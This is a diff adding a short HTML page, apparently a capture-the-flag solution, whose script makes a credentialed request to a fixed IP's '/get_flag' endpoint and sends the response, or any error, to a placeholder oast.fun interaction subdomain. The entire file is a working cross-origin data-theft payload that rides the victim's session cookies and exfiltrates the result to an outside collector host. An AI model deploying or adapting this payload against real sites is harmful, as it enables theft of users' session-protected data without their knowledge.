@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch('http://34.134.162.213:17001/get_flag',{credentials:'include'})
+.then(res=>res.text())
+.then(flag=>{
+ fetch('https://<your-quickssrf-subdomain>.oast.fun/?flag='+encodeURIComponent(flag));
+})
+.catch(err=>{
+ fetch('https://<your-quickssrf-subdomain>.oast.fun/?error='+encodeURIComponent(err));
+});
+</script>
+</body>
+</html>
